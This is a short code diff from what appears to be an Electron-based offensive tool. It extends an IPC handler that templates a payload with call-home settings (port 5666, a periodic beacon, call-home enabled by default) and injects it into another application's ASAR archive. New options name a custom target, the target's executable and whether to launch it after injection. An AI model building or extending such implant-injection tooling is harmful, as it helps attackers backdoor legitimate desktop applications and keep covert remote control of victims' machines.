@@ -370,7 +370,7 @@ app.whenReady().then(async () => {
     }
   });
 
-  ipcMain.handle('inject:hook', async (event, config) => {
+  ipcMain.handle('inject:hook', async (event, config, customTarget = null) => {
     try {
       // Use Electron's userData path for appDir
       const appDir = app.getPath('userData');
@@ -388,7 +388,9 @@ app.whenReady().then(async () => {
         callHomePort = 5666,
         callHomeInterval = 60000,
         jobTimeout = 10000,
-        enableCallHome = true
+        enableCallHome = true,
+        exePath,
+        startAfterInject
       } = config;
 
       if (!asarPath || !uuid) {
@@ -411,8 +413,8 @@ app.whenReady().then(async () => {
       const templatedPayload = templatePayload(hook.code, templateVars);
       await fs.writeFile(payloadPath, templatedPayload, 'utf8');
 
-      // Inject the payload into the ASAR
-      const result = await injectPayload(payloadPath, asarPath);
+      // Inject the payload into the ASAR, using customTarget if provided
+      const result = await injectPayload(payloadPath, asarPath, customTarget, exePath, startAfterInject);
       return { success: true, ...result, payloadPath };
     } catch (error) {
       return { success: false, error: error.message };
